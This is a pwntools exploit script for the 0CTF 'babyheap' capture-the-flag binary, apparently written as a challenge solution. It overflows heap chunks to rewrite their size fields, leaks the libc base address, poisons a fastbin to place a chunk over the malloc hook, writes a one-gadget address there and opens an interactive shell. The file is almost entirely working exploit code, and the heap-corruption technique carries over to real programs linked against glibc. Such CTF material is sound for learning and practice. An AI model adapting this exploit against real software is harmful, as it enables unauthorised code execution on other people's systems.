#!/usr/bin/python2

from pwn import *

context.arch = 'amd64'
FILENAME = "./0ctfbabyheap"
GDB = True

e = ELF(FILENAME)

def allocate(size):
    p.recvuntil("Command:")
    p.sendline("1")
    p.recvuntil("Size:")
    p.sendline(str(size))

def fill(index, content):
    p.recvuntil("Command:")
    p.sendline("2")
    p.recvuntil("Index:")
    p.sendline(str(index))
    p.recvuntil("Size:")
    p.sendline(str(len(content)))
    p.recvuntil("Content:")
    p.sendline(str(content))

def free(index):
    p.recvuntil("Command:")
    p.sendline("3")
    p.recvuntil("Index:")
    p.sendline(str(index))

def dump(index):
    p.recvuntil("Command:")
    p.sendline("4")
    p.recvuntil("Index")
    p.sendline(str(index))
    p.recvline()
    return p.recvline().rstrip()


p = process(FILENAME, env={"LD_PRELOAD" : "./libc-2.25-no-tcache.so"})

if GDB:
    gdb.attach(p)

allocate(10)        # -> A
allocate(10)        # -> B
allocate(10)        # -> C
allocate(10)        # -> D
allocate(0x80)      # -> E {sizeof(smallbin[0]) in 64 bit}
allocate(10)        # altrimenti E va in top chunk dopo free

free(2)
free(1)

payload =  p64(0) * 3
payload += p64(0x21)
payload += p8(0x80)
fill(0, payload)

payload =  p64(0) * 3
payload += p64(0x21)
fill(3, payload)

allocate(10)
allocate(10)

payload =  p64(0) * 3
payload += p64(0x91)
fill(3, payload)

free(4)

libc_base = u64(dump(2)[:8]) - 0x19bb58
log.success("LEAKED LIBC BASE ADDRESS: 0x%x!!!" % libc_base)

pause()
allocate(10)

allocate(0x68)
allocate(0x68)

free(7)

payload =  p64(0) * 17
payload += p64(0x71)
payload += p64(libc_base + 0x19bacd)
fill(6, payload)

allocate(0x68)
allocate(0x68)  # pos 8

payload =  p8(0) * 19
payload += p64(libc_base + 0x45682)     # magic gadget
fill(8, payload)


allocate(1)

#pause()
p.interactive()
#p.close()